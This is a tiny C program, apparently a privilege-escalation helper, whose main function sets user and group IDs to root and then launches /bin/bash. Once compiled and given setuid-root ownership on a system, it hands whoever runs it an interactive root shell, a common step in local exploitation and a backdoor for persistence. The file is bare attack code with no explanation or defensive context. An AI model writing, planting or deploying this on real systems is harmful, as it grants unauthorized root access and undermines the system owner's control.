#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0);
  setgid(0);
  execl("/bin/bash", "bash", NULL);
}
